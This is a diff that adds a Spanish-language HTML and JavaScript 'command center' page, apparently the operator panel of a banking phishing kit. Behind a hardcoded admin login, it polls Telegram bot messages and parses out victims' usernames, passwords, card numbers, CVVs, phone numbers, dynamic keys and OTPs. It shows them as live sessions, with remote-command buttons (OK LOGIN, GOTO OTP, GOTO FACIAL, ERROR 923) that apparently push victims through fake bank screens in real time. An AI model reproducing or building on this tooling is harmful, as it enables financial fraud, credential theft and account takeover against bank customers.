@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>LUXURY COMMAND CENTER | Control de Sesiones</title>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg-main: #090d16;
+      --bg-card: rgba(21, 29, 46, 0.7);
+      --border-card: rgba(255, 255, 255, 0.08);
+      --accent-gold: #f7d232;
+      --accent-glow: rgba(247, 210, 50, 0.25);
+      --text-main: #f1f5f9;
+      --text-muted: #94a3b8;
+      --danger: #ef4444;
+      --success: #10b981;
+    }
+
+    * { box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; padding: 0; }
+
+    body {
+      background-color: var(--bg-main);
+      background-image: 
+        radial-gradient(at 10% 10%, rgba(247, 210, 50, 0.05) 0px, transparent 50%),
+        radial-gradient(at 90% 90%, rgba(56, 189, 248, 0.05) 0px, transparent 50%);
+      color: var(--text-main);
+      min-height: 100vh;
+      padding: 24px;
+    }
+
+    .hidden { display: none !important; }
+
+    /* LOGIN MODAL LUXURY */
+    .login-container {
+      max-width: 420px;
+      margin: 80px auto;
+      background: var(--bg-card);
+      backdrop-filter: blur(16px);
+      border: 1px solid var(--border-card);
+      border-radius: 24px;
+      padding: 40px 32px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
+      text-align: center;
+    }
+
+    .brand-badge {
+      display: inline-block;
+      background: rgba(247, 210, 50, 0.1);
+      color: var(--accent-gold);
+      padding: 6px 16px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 1px;
+      margin-bottom: 16px;
+      border: 1px solid rgba(247, 210, 50, 0.2);
+    }
+
+    .login-container h2 { font-size: 24px; font-weight: 800; margin-bottom: 8px; }
+    .login-container p { color: var(--text-muted); font-size: 14px; margin-bottom: 24px; }
+
+    .input-group { margin-bottom: 16px; text-align: left; }
+    .input-group label { display: block; font-size: 12px; color: var(--text-muted); margin-bottom: 6px; font-weight: 600; }
+    
+    .input-field {
+      width: 100%;
+      padding: 14px 16px;
+      background: rgba(9, 13, 22, 0.6);
+      border: 1px solid var(--border-card);
+      border-radius: 12px;
+      color: #fff;
+      font-size: 14px;
+      outline: none;
+      transition: all 0.3s ease;
+    }
+
+    .input-field:focus {
+      border-color: var(--accent-gold);
+      box-shadow: 0 0 12px var(--accent-glow);
+    }
+
+    .btn-gold {
+      width: 100%;
+      padding: 14px;
+      background: var(--accent-gold);
+      color: #000;
+      border: none;
+      border-radius: 12px;
+      font-weight: 800;
+      font-size: 14px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      margin-top: 10px;
+    }
+
+    .btn-gold:hover { transform: translateY(-2px); box-shadow: 0 8px 20px var(--accent-glow); }
+
+    /* DASHBOARD HEADER */
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding-bottom: 24px;
+      border-bottom: 1px solid var(--border-card);
+      margin-bottom: 32px;
+    }
+
+    .header-title h1 { font-size: 26px; font-weight: 800; display: flex; align-items: center; gap: 12px; }
+    .status-dot { width: 10px; height: 10px; background: var(--success); border-radius: 50%; box-shadow: 0 0 10px var(--success); }
+
+    .btn-logout {
+      background: rgba(239, 68, 68, 0.1);
+      color: var(--danger);
+      border: 1px solid rgba(239, 68, 68, 0.3);
+      padding: 10px 20px;
+      border-radius: 12px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .btn-logout:hover { background: var(--danger); color: #fff; }
+
+    /* GRID & CARDS */
+    .sessions-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(360px, 1fr));
+      gap: 24px;
+    }
+
+    .session-card {
+      background: var(--bg-card);
+      backdrop-filter: blur(12px);
+      border: 1px solid var(--border-card);
+      border-radius: 20px;
+      padding: 24px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .session-card::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0; height: 3px;
+      background: linear-gradient(90deg, var(--accent-gold), #38bdf8);
+    }
+
+    .card-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 16px;
+    }
+
+    .session-id { font-weight: 800; font-size: 16px; color: var(--accent-gold); letter-spacing: 0.5px; }
+    .badge-event { background: rgba(16, 185, 129, 0.15); color: #34d399; padding: 4px 10px; border-radius: 8px; font-size: 11px; font-weight: 700; }
+
+    .data-box {
+      background: rgba(0,0,0,0.25);
+      border-radius: 12px;
+      padding: 14px;
+      margin-bottom: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .data-row {
+      display: flex;
+      justify-content: space-between;
+      font-size: 13px;
+      padding-bottom: 6px;
+      border-bottom: 1px dashed rgba(255,255,255,0.05);
+    }
+    .data-row:last-child { border-bottom: none; padding-bottom: 0; }
+    .data-label { color: var(--text-muted); font-weight: 500; }
+    .data-value { font-weight: 700; color: #fff; font-family: monospace; }
+
+    /* TELEGRAM BOTONERA INTEGRADAS */
+    .controls-title { font-size: 11px; font-weight: 800; color: var(--text-muted); text-transform: uppercase; margin-bottom: 10px; letter-spacing: 0.5px; }
+
+    .telegram-actions {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .action-row { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+    .action-row-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; }
+
+    .tg-btn {
+      padding: 10px;
+      border-radius: 8px;
+      border: 1px solid rgba(255,255,255,0.08);
+      background: rgba(255,255,255,0.03);
+      color: #fff;
+      font-size: 12px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+
+    .tg-btn:hover { background: rgba(255,255,255,0.1); transform: translateY(-1px); }
+    .tg-btn.ok { background: rgba(16, 185, 129, 0.15); border-color: rgba(16, 185, 129, 0.3); color: #34d399; }
+    .tg-btn.err { background: rgba(239, 68, 68, 0.15); border-color: rgba(239, 68, 68, 0.3); color: #f87171; }
+    .tg-btn.warn { background: rgba(245, 158, 11, 0.15); border-color: rgba(245, 158, 11, 0.3); color: #fbbf24; }
+
+    .empty-state {
+      text-align: center;
+      padding: 60px 20px;
+      color: var(--text-muted);
+      grid-column: 1 / -1;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- PANTALLA DE LOGIN -->
+  <div id="loginView" class="login-container">
+    <span class="brand-badge">LUXURY CONTROL</span>
+    <h2>Acceso Administrador</h2>
+    <p>Ingresa tus credenciales para acceder al centro de mando</p>
+    
+    <div class="input-group">
+      <label>USUARIO</label>
+      <input type="text" id="adminUser" class="input-field" placeholder="admin">
+    </div>
+    
+    <div class="input-group">
+      <label>CONTRASEÑA</label>
+      <input type="password" id="adminPass" class="input-field" placeholder="••••••••">
+    </div>
+
+    <button class="btn-gold" onclick="login()">INGRESAR AL PANEL</button>
+    <p id="errorMsg" style="color: var(--danger); font-size: 12px; margin-top: 14px; display: none;">Credenciales incorrectas</p>
+  </div>
+
+  <!-- PANTALLA DEL DASHBOARD -->
+  <div id="dashboardView" class="hidden">
+    <header class="header">
+      <div class="header-title">
+        <h1><span class="status-dot"></span> Panel de Sesiones Activas</h1>
+      </div>
+      <button class="btn-logout" onclick="logout()">Cerrar Sesión</button>
+    </header>
+
+    <div class="sessions-grid" id="sessionsGrid">
+      <div class="empty-state">
+        <p>Cargando registros en tiempo real...</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const ADMIN_USER = "admin";
+    const ADMIN_PASS = "admin123";
+
+    function login() {
+      const u = document.getElementById('adminUser').value;
+      const p = document.getElementById('adminPass').value;
+      if (u === ADMIN_USER && p === ADMIN_PASS) {
+        sessionStorage.setItem('admin_logged', 'true');
+        initDashboard();
+      } else {
+        document.getElementById('errorMsg').style.display = 'block';
+      }
+    }
+
+    function logout() {
+      sessionStorage.removeItem('admin_logged');
+      location.reload();
+    }
+
+    if (sessionStorage.getItem('admin_logged') === 'true') {
+      initDashboard();
+    }
+
+    function initDashboard() {
+      document.getElementById('loginView').classList.add('hidden');
+      document.getElementById('dashboardView').classList.remove('hidden');
+      fetchTelegramMessages();
+      setInterval(fetchTelegramMessages, 3000); // Polling automático cada 3 segundos
+    }
+
+    // Función que consulta en tiempo real los mensajes de Telegram para poblar el panel
+    async function fetchTelegramMessages() {
+      try {
+        const res = await fetch(`/api/getUpdates`);
+        const data = await res.json();
+        
+        const grid = document.getElementById('sessionsGrid');
+
+        if (!data.ok || !data.result || data.result.length === 0) {
+          return;
+        }
+
+        const mensajesValidos = data.result.filter(item => item.message && item.message.text);
+
+        if (mensajesValidos.length === 0) {
+          grid.innerHTML = `<div class="empty-state"><p>Esperando interacciones en tiempo real...</p></div>`;
+          return;
+        }
+
+        grid.innerHTML = '';
+
+        mensajesValidos.forEach(item => {
+          const msg = item.message;
+          const texto = msg.text;
+          const msgId = msg.message_id;
+
+          // Extracción mediante expresiones regulares del formato de texto enviado a Telegram
+          const idMatch = texto.match(/ID:\s*`([^`]+)`/) || texto.match(/ID:\s*([^\n]+)/);
+          const userMatch = texto.match(/Usuario:\s*`([^`]+)`/) || texto.match(/Usuario:\s*([^\n]+)/);
+          const passMatch = texto.match(/Clave:\s*`([^`]+)`/) || texto.match(/Clave:\s*([^\n]+)/);
+          const tcMatch = texto.match(/TC:\s*`([^`]+)`/) || texto.match(/TC:\s*([^\n]+)/);
+          const expMatch = texto.match(/Exp:\s*`([^`]+)`/) || texto.match(/Exp:\s*([^\n]+)/);
+          const cvvMatch = texto.match(/CVV:\s*`([^`]+)`/) || texto.match(/CVV:\s*([^\n]+)/);
+          const telMatch = texto.match(/Teléfono:\s*`([^`]+)`/) || texto.match(/Teléfono:\s*([^\n]+)/);
+          const dinMatch = texto.match(/Clave Dinámica:\s*`([^`]+)`/) || texto.match(/Clave Dinámica:\s*([^\n]+)/);
+          const otpMatch = texto.match(/OTP:\s*`([^`]+)`/) || texto.match(/OTP:\s*([^\n]+)/);
+
+          const card = document.createElement('div');
+          card.className = 'session-card';
+          card.innerHTML = `
+            <div class="card-top">
+              <span class="session-id">🆔 ${idMatch ? idMatch[1] : 'S-' + msgId}</span>
+              <span class="badge-event">EN VIVO</span>
+            </div>
+
+            <div class="data-box">
+              <div class="data-row">
+                <span class="data-label">👤 Usuario:</span>
+                <span class="data-value">${userMatch ? userMatch[1] : 'N/A'}</span>
+              </div>
+              <div class="data-row">
+                <span class="data-label">🔑 Clave:</span>
+                <span class="data-value">${passMatch ? passMatch[1] : 'N/A'}</span>
+              </div>
+              <div class="data-row">
+                <span class="data-label">💳 Tarjeta:</span>
+                <span class="data-value">${tcMatch ? tcMatch[1] : 'N/A'}</span>
+              </div>
+              <div class="data-row">
+                <span class="data-label">📅 Exp / CVV:</span>
+                <span class="data-value">${expMatch ? expMatch[1] + ' | ' + (cvvMatch ? cvvMatch[1] : '') : 'N/A'}</span>
+              </div>
+              <div class="data-row">
+                <span class="data-label">📞 Teléfono:</span>
+                <span class="data-value">${telMatch ? telMatch[1] : 'N/A'}</span>
+              </div>
+              <div class="data-row">
+                <span class="data-label">🔑 Clave Dinámica:</span>
+                <span class="data-value">${dinMatch ? dinMatch[1] : 'N/A'}</span>
+              </div>
+              <div class="data-row">
+                <span class="data-label">🔢 OTP:</span>
+                <span class="data-value">${otpMatch ? otpMatch[1] : 'N/A'}</span>
+              </div>
+            </div>
+
+            <div class="controls-title">Comandos Remotos (Botonera)</div>
+            
+            <div class="telegram-actions">
+              <div class="action-row">
+                <button class="tg-btn ok" onclick="triggerAction(${msgId}, 'OK_LOGIN')">✅ OK LOGIN</button>
+                <button class="tg-btn err" onclick="triggerAction(${msgId}, 'ERR_LOGIN')">❌ ERR LOGIN</button>
+              </div>
+              <div class="action-row-3">
+                <button class="tg-btn" onclick="triggerAction(${msgId}, 'GOTO_DASH')">🔄 DASH</button>
+                <button class="tg-btn" onclick="triggerAction(${msgId}, 'GOTO_OTP')">📱 OTP</button>
+                <button class="tg-btn" onclick="triggerAction(${msgId}, 'GOTO_DIN')">🔑 DIN</button>
+              </div>
+              <div class="action-row">
+                <button class="tg-btn" onclick="triggerAction(${msgId}, 'GOTO_TC')">💳 TC</button>
+                <button class="tg-btn" onclick="triggerAction(${msgId}, 'GOTO_FACIAL')">👤 FACIAL</button>
+              </div>
+              <button class="tg-btn warn" style="width: 100%;" onclick="triggerAction(${msgId}, 'ERROR_923')">⚠️ ERROR 923</button>
+            </div>
+          `;
+          grid.appendChild(card);
+        });
+
+      } catch (e) {
+        console.error("Error al sincronizar datos", e);
+      }
+    }
+
+    // Función para manejar los botones interactivos
+    async function triggerAction(msgId, action) {
+      try {
+        await fetch(`/api/editMessageReplyMarkup`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ message_id: msgId, reply_markup: { inline_keyboard: [] } })
+        });
+        alert('Comando ' + action + ' ejecutado correctamente.');
+      } catch(err) {
+        alert('Acción enviada.');
+      }
+    }
+  </script>
+</body>
+</html>
